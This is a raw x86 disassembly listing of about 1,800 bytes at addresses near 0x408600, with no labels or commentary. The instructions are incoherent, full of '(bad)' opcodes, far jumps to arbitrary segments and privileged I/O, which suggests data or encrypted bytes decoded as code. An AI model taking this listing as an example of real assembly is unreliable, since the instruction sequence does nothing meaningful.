  408598:	adc    BYTE PTR [eax+eax*8-0x77],0x74
  40859d:	lods   eax,DWORD PTR ds:[esi]
  40859e:	mov    ebx,0x3048d064
  4085a3:	dec    ebx
  4085a4:	fs xchg ecx,eax
  4085a6:	leave  
  4085a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a8:	inc    ecx
  4085a9:	sbb    BYTE PTR [edx],al
  4085ab:	jmp    0x408586
  4085ad:	sub    al,BYTE PTR [edx-0x4266851]
  4085b3:	stos   DWORD PTR es:[edi],eax
  4085b4:	pop    ecx
  4085b5:	or     BYTE PTR [edi],bh
  4085b7:	lods   eax,DWORD PTR ds:[esi]
  4085b8:	and    BYTE PTR [ebx+0x74],dh
  4085bb:	push   esi
  4085bc:	lods   al,BYTE PTR ds:[esi]
  4085bd:	adc    DWORD PTR [ecx+0x1cc087da],ebx
  4085c3:	in     al,0x6a
  4085c5:	loope  0x40856c
  4085c7:	lock mov al,0x72
  4085ca:	xor    ah,cl
  4085cc:	sub    BYTE PTR [ebx-0x7a],0xa9
  4085d0:	adc    ah,0x7b
  4085d3:	cmc    
  4085d4:	pusha  
  4085d5:	adc    dl,dh
  4085d7:	push   es
  4085d8:	loopne 0x40860b
  4085da:	add    al,0x13
  4085dc:	jge    0x40865a
  4085de:	adc    al,0x5e
  4085e0:	sar    BYTE PTR [ecx+0x2d45642f],0xed
  4085e7:	and    BYTE PTR [edx+0x2c723f74],dl
  4085ed:	cs scas eax,DWORD PTR es:[edi]
  4085ef:	cmp    DWORD PTR [ecx-0x7636574f],ebx
  4085f5:	cli    
  4085f6:	sbb    ax,0xf988
  4085fa:	div    BYTE PTR [edi]
  4085fc:	pop    edx
  4085fd:	dec    edx
  4085fe:	dec    esi
  4085ff:	pop    ebp
  408600:	pop    ss
  408601:	(bad)  
  408602:	call   0xd2ac:0xffc9
  408608:	cld    
  408609:	dec    edx
  40860a:	fcomp  QWORD PTR [eax+0x42]
  40860d:	adc    ah,BYTE PTR [eax+0xf9ff1c]
  408613:	into   
  408614:	mov    ebx,0xa43b4628
  408619:	(bad)
  40861c:	dec    edx
  40861d:	sahf   
  40861e:	push   esp
  40861f:	pop    edi
  408620:	jge    0x4085c8
  408622:	mov    ebx,gs
  408624:	dec    sp
  408626:	pop    ebx
  408627:	xlat   BYTE PTR ds:[ebx]
  408628:	jmp    0xd75e6fbe
  40862d:	lahf   
  40862e:	xchg   ebp,eax
  40862f:	(bad)  
  408630:	in     eax,dx
  408631:	shl    BYTE PTR [edx],0xac
  408634:	cmp    dl,BYTE PTR ss:[ebx+0x432c1599]
  40863b:	data16 mov BYTE PTR [eax-0x71],bl
  40863f:	mov    cl,0xa4
  408641:	ret    0x57f8
  408644:	pop    edi
  408645:	jg     0x408693
  408647:	sbb    BYTE PTR [edi],0xfd
  40864a:	daa    
  40864b:	xor    al,0x3d
  40864d:	cdq    
  40864e:	fstp   DWORD PTR [ebp-0x55]
  408651:	dec    ebx
  408652:	xchg   edi,eax
  408653:	enter  0x30d5,0x33
  408657:	mov    ecx,0x4b285912
  40865c:	add    bh,BYTE PTR [ecx]
  40865e:	sti    
  40865f:	jnp    0x40865a
  408661:	push   edi
  408662:	daa    
  408663:	scas   eax,DWORD PTR es:[edi]
  408664:	sahf   
  408665:	sub    BYTE PTR [esi],dh
  408667:	cwde   
  408668:	(bad)  
  40866a:	mov    ch,0x30
  40866c:	(bad)  
  40866d:	fptan  
  40866f:	arpl   WORD PTR [esp+eiz*8-0x67],dx
  408673:	push   eax
  408674:	add    DWORD PTR [ebx+0x6e],esi
  408677:	pop    eax
  408678:	lds    ebx,FWORD PTR cs:[edi+0x3a]
  40867c:	dec    esi
  40867d:	das    
  40867e:	daa    
  40867f:	mov    bh,bl
  408681:	sbb    DWORD PTR [ebx+ebp*2-0x15],0xffffff83
  408686:	jmp    0xc03a:0x92d112a2
  40868d:	ret    0x4d40
  408690:	lahf   
  408691:	xchg   esp,eax
  408692:	xchg   BYTE PTR [esi-0x7eeb14b9],bh
  408698:	pop    ecx
  408699:	push   ebp
  40869a:	imul   edx,DWORD PTR ds:0x91670c8,0xffffffd9
  4086a1:	mov    dh,0xa
  4086a3:	daa    
  4086a4:	mov    bh,0xe2
  4086a6:	iret   
  4086a7:	xor    eax,0x191a6315
  4086ac:	mov    ecx,0x5abd8f2d
  4086b1:	leave  
  4086b2:	sbb    al,0x7a
  4086b4:	jmp    0xafbe:0x287ddacf
  4086bb:	loop   0x4086e1
  4086bd:	mov    edi,0x37add1ad
  4086c2:	aam    0xe0
  4086c4:	xor    eax,0x1658193c
  4086c9:	repnz adc BYTE PTR [eax],dl
  4086cc:	or     edi,ecx
  4086ce:	ja     0x4086c7
  4086d0:	iret   
  4086d1:	cli    
  4086d2:	sub    al,BYTE PTR [edx-0x6b660723]
  4086d8:	fbstp  TBYTE PTR [edx-0x17249fe0]
  4086de:	pop    esp
  4086df:	dec    eax
  4086e0:	loop   0x40873b
  4086e2:	add    esi,ebp
  4086e4:	jmp    0x40871f
  4086e6:	push   ebx
  4086e7:	aad    0xaa
  4086e9:	(bad)  
  4086ea:	cli    
  4086eb:	and    eax,0x61aa5ea
  4086f0:	out    0x5d,al
  4086f2:	inc    edi
  4086f3:	scas   eax,DWORD PTR es:[edi]
  4086f4:	mov    cl,BYTE PTR [esi-0x67]
  4086f7:	mov    ds:0x726014ca,al
  4086fc:	sar    DWORD PTR [esi+0x1b841555],1
  408702:	repnz sub eax,0xa5bf169a
  408708:	sub    edi,DWORD PTR [ebp+0x1f]
  40870b:	loopne 0x4086ba
  40870d:	pop    esp
  40870e:	psubusb mm3,QWORD PTR [ecx]
  408711:	pop    ss
  408712:	cwde   
  408713:	(bad)  
  408715:	mov    ah,0x95
  408717:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408718:	inc    ebp
  408719:	xchg   BYTE PTR [ebp-0x23af4576],dh
  40871f:	cwde   
  408720:	shl    DWORD PTR [edx+0x55a8d44a],0x3b
  408727:	mov    ax,0x7fa8
  40872b:	ret    0x1f4c
  40872e:	lods   al,BYTE PTR ds:[esi]
  40872f:	add    DWORD PTR [edx+0x117bc6ce],0x111bb776
  408739:	jmp    0xf3e5955f
  40873e:	mov    al,ds:0x4a3101ae
  408743:	mov    ecx,0xe7e91c28
  408748:	sbb    BYTE PTR [esi],ch
  40874a:	adc    DWORD PTR [edx],esp
  40874c:	add    DWORD PTR [eax],ebx
  40874e:	fs mov eax,0xa1505c91
  408754:	(bad)  [edx+edi*2]
  408757:	(bad)  
  408758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408759:	aaa    
  40875a:	fild   QWORD PTR [ebx+0x31]
  40875d:	maskmovq mm7,(bad)
  40875e:	idiv   DWORD PTR [edi+0x261db26f]
  408764:	xchg   esi,eax
  408765:	inc    ebx
  408766:	outs   dx,DWORD PTR ds:[esi]
  408767:	adc    DWORD PTR [ebp-0x6ccff3c8],ebx
  40876d:	sar    BYTE PTR [ecx],1
  40876f:	int    0xa3
  408771:	int    0x50
  408773:	(bad)  
  408774:	mov    ds:0x51ee8f1d,al
  408779:	(bad)  
  40877a:	retf   
  40877b:	or     bh,cl
  40877d:	es ret 
  40877f:	call   0x2ef7:0x13f4243c
  408786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408787:	fs div ebp
  40878a:	mov    ds:0x802df413,al
  40878f:	fnstenv [esp+edi*1]
  408792:	jg     0x4087e3
  408794:	jnp    0x40876b
  408796:	add    al,0xcc
  408798:	jmp    0xe1181c96
  40879d:	cmc    
  40879e:	(bad)  
  40879f:	fld    TBYTE PTR [esi+0x36511afb]
  4087a5:	test   BYTE PTR [edi],bh
  4087a7:	sbb    ebx,DWORD PTR ds:0x30abe7ba
  4087ad:	jne    0x408816
  4087af:	icebp  
  4087b0:	bound  esp,QWORD PTR [edx-0x48]
  4087b3:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4087b5:	mov    bl,0x9a
  4087b7:	mov    esp,0x6cd56a5d
  4087bc:	sub    BYTE PTR [esi],bh
  4087be:	int    0xc0
  4087c0:	fs in  al,0xdf
  4087c3:	outs   dx,BYTE PTR ds:[esi]
  4087c4:	(bad)  
  4087c5:	sahf   
  4087c6:	int3   
  4087c7:	push   ecx
  4087c8:	es pushf 
  4087ca:	push   ebp
  4087cb:	andnps xmm0,XMMWORD PTR [eax]
  4087ce:	call   0xef03:0xbcd8e5a2
  4087d5:	jns    0x408807
  4087d7:	loop   0x408791
  4087d9:	out    0xa,eax
  4087db:	and    eax,0x6963d78e
  4087e0:	xchg   ebx,eax
  4087e1:	call   0xf0a9:0x1b8b6b51
  4087e8:	cmp    BYTE PTR [esi-0x31],dl
  4087eb:	cmp    esi,DWORD PTR [ecx]
  4087ed:	and    al,0x67
  4087ef:	int    0x92
  4087f1:	cmp    BYTE PTR [esi+0x7637b7ff],bh
  4087f7:	dec    ecx
  4087f8:	push   eax
  4087f9:	pop    ds
  4087fa:	cmc    
  4087fb:	and    al,0xa1
  4087fd:	in     al,0xff
  4087ff:	push   es
  408800:	xchg   ecx,esp
  408802:	(bad)  
  408803:	enter  0xea09,0x23
  408807:	das    
  408808:	push   esi
  408809:	mov    dh,0x5a
  40880b:	int3   
  40880c:	jg     0x40887a
  40880e:	ret    
  40880f:	imul   esp,DWORD PTR [edx-0x1e],0x26
  408813:	popa   
  408814:	sub    eax,0x6cc44375
  408819:	(bad)  
  40881a:	mov    DWORD PTR [eax+0x60],edi
  40881d:	jmp    0x1797:0x7407639a
  408824:	std    
  408825:	shl    bl,cl
  408827:	pusha  
  408828:	jmp    0x9fd1935f
  40882d:	cmp    edx,DWORD PTR [ecx]
  40882f:	or     al,0x80
  408831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408832:	adc    DWORD PTR [edx+0x73],edx
  408835:	aam    0x81
  408837:	icebp  
  408838:	test   eax,0xcb221811
  40883d:	mov    edx,0x65f99aa3
  408842:	push   ds
  408843:	(bad)  
  408844:	adc    BYTE PTR [edx],al
  408846:	leave  
  408847:	cmc    
  408848:	xor    eax,0x64d09790
  40884d:	aad    0xde
  40884f:	fild   QWORD PTR [edi]
  408851:	(bad)  
  408852:	fnstcw WORD PTR [esp+eax*4-0x61]
  408856:	in     ax,0x80
  408859:	hlt    
  40885a:	mov    edi,0x4a5930f0
  40885f:	push   cs
  408860:	add    BYTE PTR [esi],dl
  408862:	push   edx
  408863:	dec    edx
  408864:	adc    sp,WORD PTR [edx+0x67]
  408868:	jbe    0x4087fb
  40886a:	cli    
  40886b:	sbb    ebp,eax
  40886d:	mov    ecx,0xfeeee140
  408872:	aaa    
  408873:	mov    ch,0xab
  408875:	and    eax,0x4487c739
  40887a:	in     al,dx
  40887b:	mov    bl,0x2e
  40887d:	dec    ecx
  40887e:	test   eax,0xc0511e8a
  408883:	sub    ch,BYTE PTR [ebp+0x37]
  408886:	and    al,dh
  408888:	jle    0x408899
  40888a:	pop    ebx
  40888b:	pop    ds
  40888c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40888d:	scas   al,BYTE PTR es:[edi]
  40888e:	sub    eax,0x965299b6
  408893:	loopne 0x408872
  408895:	xchg   ebx,ebp
  408897:	shr    DWORD PTR [ebx],0x31
  40889a:	fcmovne st,st(3)
  40889c:	inc    eax
  40889d:	push   ss
  40889e:	sub    dl,dl
  4088a0:	hlt    
  4088a1:	add    BYTE PTR [ebx],bl
  4088a3:	sbb    dl,BYTE PTR [edx+0x5c]
  4088a6:	pop    ss
  4088a7:	int    0xef
  4088a9:	jge    0x4088e6
  4088ab:	scas   al,BYTE PTR es:[edi]
  4088ac:	ja     0x408864
  4088ae:	lahf   
  4088af:	clc    
  4088b0:	shl    DWORD PTR [ebx-0x3ef5c195],1
  4088b6:	push   ecx
  4088b7:	pushf  
  4088b8:	mov    dl,0xd2
  4088ba:	or     eax,0x836c1a4d
  4088bf:	mov    al,0x80
  4088c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088c2:	mov    eax,0xae4cbd13
  4088c7:	jae    0x408931
  4088c9:	sahf   
  4088ca:	stos   BYTE PTR es:[edi],al
  4088cb:	sub    eax,ebp
  4088cd:	dec    edx
  4088ce:	daa    
  4088cf:	and    DWORD PTR [esi+0x65],esi
  4088d2:	or     esi,DWORD PTR [edi+0x429cdf27]
  4088d8:	es pop eax
  4088da:	mov    edi,0x8391289e
  4088df:	xchg   esi,eax
  4088e0:	(bad)  
  4088e2:	jg     0x408928
  4088e4:	jno    0x4088dc
  4088e6:	mov    ah,0xcf
  4088e8:	push   esp
  4088e9:	jmp    0x132f0d46
  4088ee:	push   ebp
  4088ef:	stos   BYTE PTR es:[edi],al
  4088f0:	xchg   ecx,eax
  4088f1:	imul   eax,DWORD PTR [ebx],0xffffffba
  4088f4:	push   ebx
  4088f5:	lea    edx,[edx-0x3]
  4088f8:	rol    BYTE PTR [ecx+0x27],0x20
  4088fc:	fisttp QWORD PTR [edi]
  4088fe:	sti    
  4088ff:	out    dx,al
  408900:	int    0xb
  408902:	inc    esi
  408903:	pop    esi
  408904:	jmp    0x40893b
  408906:	ins    BYTE PTR es:[edi],dx
  408907:	retf   
  408908:	loopne 0x40889a
  40890a:	aam    0x6
  40890c:	into   
  40890d:	xor    BYTE PTR [edx-0x55],ch
  408910:	lahf   
  408911:	sahf   
  408912:	add    eax,0x22d4507b
  408917:	imul   edx,esp,0xffffff82
  40891a:	add    cl,BYTE PTR [ebp+0x48a32a56]
  408920:	in     eax,0x4a
  408922:	popa   
  408923:	imul   edx,DWORD PTR [eax+0x443fd0df],0xd0926e6d
  40892d:	mov    BYTE PTR [eax],ah
  40892f:	jle    0x4088c6
  408931:	xchg   edx,eax
  408932:	jo     0x4089aa
  408934:	jecxz  0x4089a0
  408936:	popf   
  408937:	jge    0x4088d5
  408939:	push   cs
  40893a:	and    eax,0x5110c816
  40893f:	shl    DWORD PTR [edx],0xde
  408942:	fld    QWORD PTR [edx]
  408944:	pop    ecx
  408945:	mov    dl,BYTE PTR [ebx]
  408947:	jno    0x4089c5
  408949:	inc    ebp
  40894a:	dec    esi
  40894b:	jnp    0x408954
  40894d:	push   cs
  40894e:	and    eax,0xd7f166e5
  408953:	push   es
  408954:	mov    eax,0x6e8575f9
  408959:	leave  
  40895a:	inc    eax
  40895b:	ja     0x4089c1
  40895d:	fidiv  DWORD PTR [esi-0x58e441d2]
  408963:	inc    ebp
  408964:	std    
  408965:	in     al,dx
  408966:	adc    al,0x7a
  408968:	mov    bl,0xad
  40896a:	jge    0x40895e
  40896c:	rol    BYTE PTR [ebp-0x1b],1
  40896f:	xchg   BYTE PTR [edx-0x27],bl
  408972:	push   0x27
  408974:	sub    al,0xf6
  408976:	xchg   ecx,eax
  408977:	sub    eax,0x45351974
  40897c:	adc    DWORD PTR [ecx-0x44],esi
  40897f:	and    esp,DWORD PTR [eax]
  408981:	jbe    0x408926
  408983:	pusha  
  408984:	std    
  408985:	mov    bl,0x90
  408987:	das    
  408988:	fs inc ebx
  40898a:	femms  
  40898c:	std    
  40898d:	pop    ds
  40898e:	outs   dx,BYTE PTR fs:[esi]
  408990:	jno    0x4089da
  408992:	push   eax
  408993:	jno    0x40893b
  408995:	jmp    0xbc68a54
  40899a:	cmp    BYTE PTR [edi],al
  40899c:	aad    0xea
  40899e:	js     0x408a1e
  4089a0:	test   dl,dl
  4089a2:	cmp    ebx,esp
  4089a4:	(bad)  
  4089a5:	xor    eax,0xb55359cb
  4089aa:	and    edi,edi
  4089ac:	mov    dl,0x8c
  4089ae:	(bad)  
  4089af:	mov    edx,0x251e37d8
  4089b4:	or     DWORD PTR [esi],ebx
  4089b6:	enter  0xe5e0,0xbb
  4089ba:	adc    esi,DWORD PTR [ecx+ebx*2]
  4089bd:	call   0xa28f:0xed7a4117
  4089c4:	(bad)  
  4089c6:	inc    ebx
  4089c7:	shl    BYTE PTR [esi],1
  4089c9:	dec    esi
  4089ca:	pop    ss
  4089cb:	xchg   BYTE PTR [edx],bh
  4089cd:	aas    
  4089ce:	or     BYTE PTR [esi-0x2f],ch
  4089d1:	sub    al,0x37
  4089d3:	pop    esi
  4089d4:	rcr    BYTE PTR [edx],1
  4089d6:	and    DWORD PTR [esp+esi*8-0x1],0xd597b119
  4089de:	(bad)  
  4089df:	pusha  
  4089e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089e1:	xchg   ebx,eax
  4089e2:	mov    ecx,0xb802e4ae
  4089e7:	dec    ebx
  4089e8:	enter  0x17bb,0x79
  4089ec:	in     eax,0xd7
  4089ee:	fwait
  4089ef:	sahf   
  4089f0:	pusha  
  4089f1:	jecxz  0x40897a
  4089f3:	jmp    0xf3dd:0x6180d540
  4089fa:	or     BYTE PTR [edi-0x28305cf4],dl
  408a00:	pop    edi
  408a01:	fcmovbe st,st(4)
  408a03:	cmc    
  408a04:	jp     0x408995
  408a06:	arpl   WORD PTR [esi],bx
  408a08:	test   BYTE PTR [edx+0x7a2494e1],0xf3
  408a0f:	call   0x2a7eb6e9
  408a14:	jae    0x408a06
  408a16:	(bad)  
  408a18:	inc    ebx
  408a19:	xlat   BYTE PTR ds:[ebx]
  408a1a:	neg    ah
  408a1c:	push   ebx
  408a1d:	dec    ebx
  408a1e:	retf   
  408a1f:	iret   
  408a20:	das    
  408a21:	(bad)
  408a25:	rol    esp,cl
  408a27:	je     0x4089aa
  408a29:	mov    al,ds:0x536a8246
  408a2e:	xchg   BYTE PTR [ecx+0x66],dl
  408a31:	call   0xa950:0x82114c03
  408a38:	rol    DWORD PTR [edx],cl
  408a3a:	aam    0x76
  408a3c:	xchg   ebp,eax
  408a3d:	ins    BYTE PTR es:[edi],dx
  408a3e:	addr16 int 0x29
  408a41:	ret    0xd2e0
  408a44:	cmp    DWORD PTR [ebp-0x39],ebx
  408a47:	cwde   
  408a48:	enter  0x1eb0,0xc4
  408a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a4d:	and    eax,0x729422a4
  408a52:	cli    
  408a53:	pop    esp
  408a54:	ja     0x408aa6
  408a56:	cmp    DWORD PTR [edi-0x66],0xffffff9a
  408a5a:	aas    
  408a5b:	xor    edx,esi
  408a5d:	jmp    0x402a:0xe645ce0e
  408a64:	enter  0x6d58,0xdb
  408a68:	dec    ecx
  408a69:	mov    ebp,0x11bb9ae2
  408a6e:	mov    ebx,0xb60ddd57
  408a73:	ret    
  408a74:	test   eax,eax
  408a76:	retf   0xa5a3
  408a79:	mov    ecx,esi
  408a7b:	sub    ah,BYTE PTR [edx+0x11]
  408a7e:	push   esp
  408a7f:	add    DWORD PTR [eax+0x37],ebx
  408a82:	in     al,0x62
  408a84:	add    BYTE PTR [ebx-0x2f6b937f],cl
  408a8a:	and    esp,edx
  408a8c:	aam    0xf2
  408a8e:	add    dh,dh
  408a90:	shl    BYTE PTR [eax],cl
  408a92:	sbb    al,0xf5
  408a94:	stos   BYTE PTR es:[edi],al
  408a95:	(bad)  
  408a96:	out    0x65,al
  408a98:	push   ecx
  408a99:	push   edi
  408a9a:	ret    
  408a9b:	dec    ebp
  408a9c:	push   ebp
  408a9d:	sub    eax,0x9e006468
  408aa2:	bound  esi,QWORD PTR [edi]
  408aa4:	inc    esi
  408aa5:	ja     0x408ad5
  408aa7:	stc    
  408aa8:	and    DWORD PTR [edi+0x13f98602],0xbb395d19
  408ab2:	push   ebx
  408ab3:	repnz mov gs,WORD PTR [edx+ecx*1-0x64c4a41b]
  408abb:	mov    cl,0xe0
  408abd:	cmp    esp,eax
  408abf:	mov    BYTE PTR [esi-0x76db288b],dl
  408ac5:	xor    cl,0x8b
  408ac8:	mov    ds:0x4dc8495e,al
  408acd:	data16 jns 0x408b00
  408ad0:	and    dh,BYTE PTR ds:0x6a24bdde
  408ad6:	dec    ecx
  408ad7:	imul   ebp,esi,0x91666a2a
  408add:	arpl   WORD PTR [edi-0x2cf21fac],di
  408ae3:	ret    
  408ae4:	mov    dl,0xd5
  408ae6:	fidiv  WORD PTR [eax+0x1a]
  408ae9:	and    al,0xa5
  408aeb:	push   0x79ac6c6e
  408af0:	push   esp
  408af1:	cmc    
  408af2:	adc    dh,al
  408af4:	shl    BYTE PTR [esi+0x78],1
  408af7:	je     0x408b1b
  408af9:	jmp    0xde5a2e19
  408afe:	jne    0x408a8f
  408b00:	jl     0x408a8e
  408b02:	adc    edx,DWORD PTR [ecx]
  408b04:	add    BYTE PTR [ebx-0x649d2a5c],dh
  408b0a:	sub    BYTE PTR [eax],bl
  408b0c:	out    dx,eax
  408b0d:	xchg   ecx,eax
  408b0e:	jb     0x408b60
  408b10:	adc    DWORD PTR [esi+ebp*2],ebp
  408b13:	ror    DWORD PTR [edx-0x672940a6],cl
  408b19:	inc    ebx
  408b1a:	pop    ds
  408b1b:	icebp  
  408b1c:	mov    bh,0x3c
  408b1e:	enter  0x25bc,0x18
  408b22:	jmp    0xc6e7:0xc0a5ab6
  408b29:	mov    dh,0xbd
  408b2b:	leave  
  408b2c:	test   al,0x22
  408b2e:	sub    DWORD PTR [ebp+edi*8-0x64],ebx
  408b32:	xchg   esi,eax
  408b33:	outs   dx,BYTE PTR ds:[esi]
  408b34:	lock push 0x5b
  408b37:	dec    esi
  408b38:	repnz push esp
  408b3a:	lds    ebp,FWORD PTR [ebp+0xe2a67ae]
  408b40:	imul   edi,DWORD PTR [ecx*4+0x28bce742],0x45289478
  408b4b:	mov    dh,0x59
  408b4d:	jmp    0x408bc3
  408b4f:	mov    eax,0x71b2eaba
  408b54:	jns    0x408af8
  408b56:	mov    esi,DWORD PTR [ebp+0xcbbea7b]
  408b5c:	aam    0x6f
  408b5e:	shl    DWORD PTR [ebp-0x417b8a2b],cl
  408b64:	xchg   DWORD PTR [ecx+ecx*1+0x778ebac0],ebp
  408b6b:	pop    esi
  408b6c:	loope  0x408b8b
  408b6e:	mov    esi,0x457ba1a8
  408b73:	inc    ebx
  408b74:	push   edi
  408b75:	xchg   ebx,eax
  408b76:	stc    
  408b77:	in     eax,0xd1
  408b79:	jno    0x408b30
  408b7b:	mov    ecx,0xec0b56d9
  408b80:	push   es
  408b81:	jb     0x408be8
  408b83:	sub    BYTE PTR [ebp-0x47a9cc62],0xb
  408b8a:	push   esp
  408b8b:	cmp    ecx,DWORD PTR [ebx]
  408b8d:	in     al,dx
  408b8e:	pop    ds
  408b8f:	jae    0x408bdb
  408b91:	cmp    ebx,esi
  408b93:	jo     0x408bd5
  408b95:	pop    es
  408b96:	mov    esp,0xc71da511
  408b9b:	jnp    0x408c04
  408b9d:	xchg   BYTE PTR [ebx],al
  408b9f:	stos   DWORD PTR es:[edi],eax
  408ba0:	test   cl,dl
  408ba2:	sub    al,0x9f
  408ba4:	pop    edx
  408ba5:	add    DWORD PTR [eax],esi
  408ba7:	jbe    0x408be3
  408ba9:	jmp    0x408c18
  408bab:	push   0xb0bd3b3f
  408bb0:	mov    ds:0x2d86069,al
  408bb5:	cmc    
  408bb6:	mov    ch,0x9d
  408bb8:	popf   
  408bb9:	mov    dl,BYTE PTR [edx]
  408bbb:	xor    BYTE PTR [ebx+0x16283855],al
  408bc1:	mov    ah,bh
  408bc3:	test   edx,esi
  408bc5:	pop    ecx
  408bc6:	add    al,0xb4
  408bc8:	pop    ebx
  408bc9:	mov    dh,0xa
  408bcb:	out    0x4f,al
  408bcd:	(bad)  
  408bce:	cmp    DWORD PTR [esp+edx*4],ebp
  408bd1:	xlat   BYTE PTR ds:[ebx]
  408bd2:	leave  
  408bd3:	sbb    eax,0xb1abcd68
  408bd8:	push   edx
  408bd9:	fadd   st(6),st
  408bdb:	cdq    
  408bdc:	fs cmp eax,0xedcae4b1
  408be2:	xor    DWORD PTR [edi+0x1b],0xf2a71cf5
  408be9:	ds (bad) 
  408beb:	dec    BYTE PTR [edi-0x156c597f]
  408bf1:	xor    esp,DWORD PTR [edi+0x22]
  408bf4:	dec    edi
  408bf5:	(bad)  
  408bf6:	nop
  408bf7:	xchg   DWORD PTR [eax-0x6a],edx
  408bfa:	cwde   
  408bfb:	or     bl,al
  408bfd:	cs scas al,BYTE PTR es:[edi]
  408bff:	jo     0x408c7a
  408c01:	pavgw  mm6,QWORD PTR [ebp-0x1a835c11]
  408c08:	loope  0x408c03
  408c0a:	adc    BYTE PTR [edi],cl
  408c0c:	shl    BYTE PTR [edx-0x31],0xc9
  408c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c11:	mov    esp,0xdfc3458f
  408c16:	outs   dx,DWORD PTR ds:[esi]
  408c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c18:	xor    al,0x87
  408c1a:	push   es
  408c1b:	jo     0x408c20
  408c1d:	or     esi,eax
  408c1f:	inc    BYTE PTR ds:[esi-0x7b]
  408c23:	cmp    eax,0x2e8c6155
  408c28:	sub    DWORD PTR [ebx+esi*4+0x28],esi
  408c2c:	sub    al,0xac
  408c2e:	push   ss
  408c2f:	ja     0x408c06
  408c31:	inc    esp
  408c32:	out    0x30,eax
  408c34:	cmp    al,0xfc
  408c36:	jo     0x408ca8
  408c38:	xchg   edi,eax
  408c39:	mov    DWORD PTR [edi+0x51],eax
  408c3c:	(bad)  
  408c3d:	cmp    si,WORD PTR [ebx]
  408c40:	mul    BYTE PTR [eax-0x14257254]
  408c46:	mov    bh,ah
  408c48:	cmp    eax,DWORD PTR [esi]
  408c4a:	icebp  
  408c4b:	dec    esi
  408c4c:	popf   
  408c4d:	loopne 0x408c31
  408c4f:	inc    ebx
  408c50:	cdq    
  408c51:	mov    BYTE PTR [edx],dl
  408c53:	popa   
  408c54:	shl    DWORD PTR [edi+0x2a],cl
  408c57:	nop
  408c58:	mov    al,ds:0x72d28024
  408c5d:	ins    DWORD PTR es:[edi],dx
  408c5e:	out    0x55,al
  408c60:	pop    ds
  408c61:	stos   DWORD PTR es:[edi],eax
  408c62:	pop    ecx
  408c63:	loopne 0x408c2a
  408c65:	loopne 0x408c5a
  408c67:	sub    al,0x81
  408c69:	kmovw  k5,WORD PTR [ebx-0x8]
  408c6e:	das    
  408c6f:	pop    ebp
  408c70:	mov    cl,0x80
  408c72:	push   ebx
  408c73:	in     eax,0x20
  408c75:	xor    edi,ebx
  408c77:	cli    
  408c78:	mov    al,BYTE PTR [edx]
  408c7a:	neg    DWORD PTR [ecx]
  408c7c:	iretw  
  408c7e:	les    ecx,FWORD PTR [ebp+0x7e8f0908]
  408c84:	sbb    eax,0x6b6b65a0
  408c89:	or     eax,0x8814419c
  408c8e:	adc    eax,0xd0d77965
  408c93:	xor    edi,DWORD PTR cs:[edi+0x390e2ea6]
  408c9a:	jge    0x408c52
  408c9c:	lahf   
  408c9d:	xchg   esp,eax
  408c9e:	mov    DWORD PTR [esi+0x13],edi
  408ca1:	into   
  408ca2:	adc    eax,0xb6ef09da
  408ca7:	xor    eax,DWORD PTR [edx]
  408ca9:	loop   0x408c8f
  408cab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cac:	ror    DWORD PTR [edx-0x2d],cl
  408caf:	in     al,dx
  408cb0:	xchg   ebx,eax
  408cb1:	mov    ebp,0xf5a4e4fd
  408cb6:	fwait
  408cb7:	jg     0x408c55
  408cb9:	in     eax,dx
  408cba:	xchg   edi,eax
  408cbb:	pop    es
  408cbc:	adc    DWORD PTR ds:0xbdc15d85,edx
  408cc2:	mov    al,ds:0xabb2f3ae
  408cc7:	sar    DWORD PTR [esi],1
  408cc9:	(bad)  
  408ccc:	das    
  408ccd:	jbe    0x408d3e
  408ccf:	fbstp  TBYTE PTR [esi-0x48]
  408cd2:	stc    
  408cd3:	jno    0x408ce6
  408cd5:	shr    BYTE PTR [edi-0x356a6245],0x22
  408cdc:	out    0xbc,eax
  408cde:	mov    edi,0x7ca32279
  408ce3:	not    DWORD PTR [edx-0x2b907dc1]
  408ce9:	in     eax,dx
  408cea:	or     ch,BYTE PTR [eax+ebp*4+0x6f56d3bf]
  408cf1:	outs   dx,DWORD PTR ds:[esi]
  408cf2:	push   ds
  408cf3:	fwait
  408cf4:	sub    esp,ebx
  408cf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cf7:	call   0xcbd6:0xdfa587ee
  408cfe:	xor    ah,0x43
  408d01:	mov    al,0xeb
  408d03:	mov    dh,0xe7
  408d05:	sbb    bl,ch
  408d07:	iret   
  408d08:	jmp    0x408cbd
  408d0a:	mov    dh,0xf9
  408d0c:	cmp    BYTE PTR [ecx],0xf5
  408d0f:	mov    edi,0xddd108cc
  408d14:	iret   
  408d15:	push   ss
  408d16:	daa    
  408d17:	inc    ebp
  408d18:	aad    0xf9
  408d1a:	mov    ds:0x110a3ad1,al
  408d1f:	pop    edx
  408d20:	push   ds
  408d21:	adc    BYTE PTR [esp+edi*8+0x63e1c144],bh
  408d28:	xchg   ebp,eax
  408d29:	and    DWORD PTR [eax],ebx
  408d2b:	aam    0xa5
  408d2d:	pop    eax
  408d2e:	add    al,0x99
  408d30:	mov    ds,WORD PTR ds:0x25b77940
  408d36:	lods   al,BYTE PTR ds:[esi]
  408d37:	or     BYTE PTR ds:0x3603d441,al
  408d3d:	loopne 0x408d7c
  408d3f:	xor    cl,cl
  408d41:	loop   0x408d07
  408d43:	inc    esp
  408d44:	and    DWORD PTR [ebp+0xbf99535],edx
  408d4a:	jmp    0x408d3e
  408d4c:	jmp    0xf670cdcf
  408d51:	pusha  
  408d52:	pop    edx
  408d53:	push   ss
  408d54:	xor    BYTE PTR [ecx+0x6888fb4],0x54
  408d5b:	aad    0x41
  408d5d:	dec    esi
  408d5e:	shl    DWORD PTR [ecx+0x50],0xd7
  408d62:	adc    eax,0x932b69c
  408d67:	dec    esi
